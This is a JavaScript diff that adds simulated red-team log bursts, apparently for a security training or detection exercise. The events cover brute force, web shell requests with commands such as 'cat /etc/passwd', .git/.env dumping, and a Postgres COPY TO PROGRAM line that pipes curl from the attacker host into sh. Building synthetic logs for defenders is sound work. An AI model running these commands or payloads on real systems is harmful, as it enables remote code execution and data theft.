@@ -108,9 +108,65 @@ function buildCedarline(ctx) {
   return out;
 }
 
+// Per-finding red-team bursts: what the red team does to THIS weakness shows up in the logs as that activity.
+function findingWave(fid, att, P, host, bad, t, n) {
+  const out = [];
+  switch (fid) {
+    case 'firewall-anyany':
+      for (let k = 0; k < n; k++) out.push(fw(t, P.fw, att, ctx_wan(P), pr(k + 5), [3389, 445, 3306, 5432, 135, 5900, 23][k % 7], 'pass', 'in'));
+      return out;
+    case 'web-admin-default':
+      for (let k = 0; k < n; k++) out.push(web(t, host, att, 'POST', '/wp-login.php', bad && k >= n - 3 ? 302 : 200, bad && k >= n - 3 ? 0 : 4410, 'python-requests/2.31.0'));
+      if (bad) out.push(web(t, host, att, 'GET', '/wp-admin/plugin-install.php', 200, 61230, 'python-requests/2.31.0'));
+      return out;
+    case 'web-shell':
+      for (let k = 0; k < n; k++) out.push(web(t, host, att, 'GET', `/wp-content/uploads/2026/10/stats.php?cmd=${['id', 'whoami', 'uname+-a', 'crontab+-l', 'cat+/etc/passwd'][k % 5]}`, 200, 80 + k));
+      return out;
+    case 'mysql-exposed':
+      for (let k = 0; k < n; k++) out.push({ t, kind: 'db', sub: 'my_denied', host, fields: { src_ip: att, pid: pid(k), ms: '310', thread: String(3000 + k), user: 'root', dest_port: 3306, action: bad && k >= n - 3 ? 'success' : 'failure', app: 'mysqld', pw: 'YES' } });
+      return out;
+    case 'mail-open-relay':
+      for (let k = 0; k < n; k++) out.push({ t, kind: 'mail', sub: k % 3 === 2 ? 'sent' : 'connect', host, fields: { src_ip: att, pid: pid(k), lip: P.web ? '10.10.10.30' : '10.10.10.30', session: hx(k, 8) + '/' + hx(k + 9, 8), qid: hx(k + 3, 10).toUpperCase(), qid2: hx(k + 4, 5), from: `promo${k}@spam-sender.example`, rcpt: `victim${k}@gmail.example`, helo: 'kali', size: 31000 + k * 17, relay: 'mx.gmail.example', relay_ip: '192.0.2.44', delay: '0.42', action: 'success' } });
+      return out;
+    case 'ssh-root-key':
+      for (let k = 0; k < n; k++) {
+        if (bad && k >= n - 3) out.push(auth(t, host, k === n - 1 ? 'session_open' : 'accepted_key', 'root', att, { fp: 'k4Qn0Zr9mXbT2uLw7YhVd1sPcE8aJf3GoNi5RtB6yCg' }));
+        else out.push(auth(t, host, 'failed_user', 'root', att));
+      }
+      return out;
+    case 'rogue-da': case 'guest-admin':
+      for (let k = 0; k < n; k++) {
+        const who = fid === 'rogue-da' ? 'svc-backup2' : 'Guest';
+        const code = bad && k >= n - 3 ? [4624, 4672, 4728][k - (n - 3)] : 4625;
+        out.push(win(t, host, code, { user: who, Account_Name: who, Logon_Type: 3, src_ip: att, src_port: pr(k), Workstation_Name: 'KALI', Account_Domain: P.netbios, Target_Account_Name: who, Group_Name: fid === 'rogue-da' ? 'Domain Admins' : 'Account Operators' }));
+      }
+      return out;
+    case 'smbv1-dc': case 'print-spooler':
+      for (let k = 0; k < n; k++) out.push(fw(t, P.fw, att, `${P.lanPrefix || '10.10.10'}.10`, pr(k + 11), fid === 'smbv1-dc' ? 445 : 135, 'pass', 'in'));
+      if (bad) out.push(win(t, host, 4688, { user: 'SYSTEM', Account_Name: 'SYSTEM', New_Process_Name: fid === 'smbv1-dc' ? 'C:\\Windows\\System32\\cmd.exe' : 'C:\\Windows\\System32\\spoolsv.exe', Creator_Process_Name: 'C:\\Windows\\System32\\services.exe' }));
+      return out;
+    case 'ws-schtask': case 'ws-local-admin':
+      for (let k = 0; k < n; k++) out.push(win(t, host, bad && k >= n - 2 ? (fid === 'ws-schtask' ? 4698 : 4720) : 4625, { user: 'Administrator', Account_Name: 'Administrator', Logon_Type: 3, src_ip: att, src_port: pr(k), Workstation_Name: 'KALI', Account_Domain: P.netbios, Task_Name: 'SystemCheck', Target_Account_Name: 'support2' }));
+      return out;
+    case 'exposed-git':
+      for (let k = 0; k < n; k++) out.push(web(t, host, att, 'GET', ['/.git/HEAD', '/.git/config', '/.git/index', '/.git/objects/pack/', '/.env'][k % 5], bad ? 200 : 403, bad ? 211 + k * 9 : 199, 'git-dumper/1.0'));
+      return out;
+    case 'postgres-trust':
+      for (let k = 0; k < n; k++) out.push({ t, kind: 'db', sub: bad && k > 2 ? 'pg_dur' : 'pg_auth', host, fields: { src_ip: att, src_port: pr(k), pid: pid(k), ms: '211', user: 'postgres', database: 'members', dest_port: 5432, statement: bad ? `COPY members TO PROGRAM 'curl http://${att}/x|sh'` : 'SELECT version()', duration: '12.411', app: 'psql', action: 'success' } });
+      return out;
+    case 'app-cron': case 'web-shell2':
+      for (let k = 0; k < n; k++) out.push(cron(t + k, host, '/tmp/.sysupd.sh >/dev/null 2>&1'));
+      return out;
+    default: return null;
+  }
+}
+const ctx_wan = (P) => P.wanIp || '203.0.113.2';
+
 function waveLinesGeneric(att, P) {
-  return (ctx, host, outcome, at0, n) => {
+  return (ctx, host, outcome, at0, n, findingId) => {
     const out = [];
+    const spec = findingId ? findingWave(findingId, att, { ...P, wanIp: ctx.P.wanIp }, host, outcome === 'compromised', at0, n) : null;
+    if (spec) return spec;
     const bad = outcome === 'compromised';
     const t = at0;
     if (host === P.web) {
